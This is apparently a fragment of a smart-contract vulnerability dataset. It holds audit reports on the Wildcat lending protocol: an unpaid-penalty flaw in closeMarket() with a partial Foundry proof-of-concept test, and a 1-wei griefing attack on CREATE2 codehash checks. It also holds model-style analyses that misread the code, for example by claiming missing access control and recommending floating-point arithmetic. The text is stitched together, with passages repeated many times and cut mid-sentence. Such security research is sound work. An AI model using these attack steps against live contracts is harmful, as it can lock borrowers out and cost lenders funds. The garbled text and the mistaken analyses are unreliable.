        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

                "decompose": "  Based on the given vulnerability knowledge and smart contract code, I have analyzed it and determined that the code is indeed vulnerable to a \"Liquidation Amount Miscalculation\" vulnerability.\n\nThe reason for this vulnerability is that the liquidation calculation function in the smart contract code does not accurately determine the base amount of debt that needs to be liquidated by taking into account the current value of the user's borrowings and collateral, using up-to-date conversion rates and multipliers to comply with the platform's liquidation rules and collateral ratios. The function uses a simple mathematical operation to calculate the amount of debt that needs to be liquidated, without taking into account any additional factors such as market fluctuations or exchange rate changes. This could lead to an incorrect calculation of the debt amount that needs to be liquidated, resulting in either too much or too little collateral being liquidated from the user's account.\n\nTo mitigate this vulnerability, the smart contract code should include a more sophisticated logic for determining the base amount of debt that needs to be liquidated, taking into account factors such as market fluctuations and exchange rate changes. This could involve using a different formula or computation logic than the one currently used in the function, or incorporating additional variables and calculations that take these factors into account. Additionally, the smart contract code should ensure consistent handling of decimals across different types of tokens to prevent underflow or overflow issues.\n\nIn summary, the given smart contract code is vulnerable to a \"Liquidation Amount Miscalculation\" vulnerability due to its use of an incorrect formula or computation logic for determining the amount of debt that needs to be liquidated. This could lead to either too much or too little collateral being liquidated from the user's account, and could result in improper liquidation amounts, either unfairly penalizing users by liquidating too much collateral or endangering the platform's solvency by liquidating too little.",
                "poc_patch": "  Based on the given vulnerability knowledge and smart contract code, I would say that the smart contract is likely vulnerable to \"Incorrect Computation in Asset Liquidation\". The reason for this assessment is as follows:\n\n1. The function `closeMarket()` has a complex logic involving several variables and calculations. This complexity may lead to potential vulnerabilities such as misinterpretation of variables, inaccurate conversions, flawed mathematical operations, or misaligned decimal handling.\n2. The function is responsible for liquidating assets from borrowers to repay their debts. However, the code does not clearly state what constitutes \"proper\" liquidation amounts or how the system should calculate these amounts. This lack of clarity may lead to incorrect calculations and potentially unfair liquidations.\n3. The function includes several variables that are relevant to the liquidation process, such as `totalDebts`, `currentlyHeld`, and `reserveRatioBips`. However, their interpretation and use in the calculation of liquidation amounts is not clearly defined in the code. This could lead to confusion or errors in calculations.\n4. The function has a condition that checks whether there are any unpaid withdrawals from borrowers. If there are, it reverts the transaction with an error message `CloseMarketWithUnpaidWithdrawals()`. However, this condition does not seem to be related to liquidation or collateral ratios. It is possible that this condition is intended for a different purpose and could potentially cause issues in the liquidation process.\n5. The function has several mathematical operations, such as addition, subtraction, multiplication, and division, which could lead to errors if not properly handled. For example, incorrect multipliers or exchange rates used in these calculations could result in improper liquidation amounts.\n6. Finally, the function does not seem to be thoroughly tested or reviewed for potential vulnerabilities. A thorough analysis of the code may reveal other potential weaknesses or issues that could lead to errors or security breaches.\n\nOverall, based on the given information and smart contract code, it is likely that the system has vulnerabilities related to incorrect computation in asset liquidation, potentially due to complexity, lack of clarity, and confusion in calculations.",

This would allow the attacker to steal assets from the borrower and potentially even mark the entire loan as paid off, resulting in a loss for the lender.\n\nTo mitigate this vulnerability, it is recommended that the smart contract code includes proper validation checks to ensure that only authorized users can close credit lines.

The `closeMarket()` function allows users to close a market and withdraw assets, but it does not check if there are any unpaid withdrawals from the borrower before doing so. This means that an attacker could potentially close a market without paying off its debt, leading to potential losses for the lender.\n2. The function also transfers assets directly to the borrower's address, which could allow an attacker to transfer their own assets to the borrower if they are able to exploit this vulnerability.\n3. Finally, the function does not use any kind of validation check to ensure that the user has permission to close the market and transfer assets. This means that an attacker could potentially perform a replay attack by closing the market multiple times or using a different account to close the market without permission.\n\nTo mitigate this vulnerability, it would be necessary to implement proper checks for unpaid withdrawals and ensure that users have permission to close the market before transferring assets. This could include adding a validation check to ensure that there are no unpaid withdrawals before closing the market, as well as implementing access control mechanisms to ensure that only authorized parties can close the market.

Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The reason for this conclusion is that the function uses integer arithmetic to perform calculations on the elapsed time between updates, which could lead to overflows if the time delta exceeds the maximum representable value. This issue can be exploited by an attacker who manipulates the time delta in order to artificially increase the effective interest rate paid to the lender.\n\nIn particular, if the time delta is a large positive number (e.g., 10^20), it will overflow and become negative when added to `previousTimeDelinquent`, causing the borrower's total time in delinquency to decrease rather than increase. This can lead to an unintended reduction in interest payments, as the borrower is not actually delinquent for a longer period of time.\n\nTo mitigate this issue, the function should use floating-point arithmetic instead of integer arithmetic when calculating the elapsed time between updates. Additionally, the function could include a check to ensure that `timeDelta` does not exceed the maximum representable value, or else throw an error if it does.",

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        "gt": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when 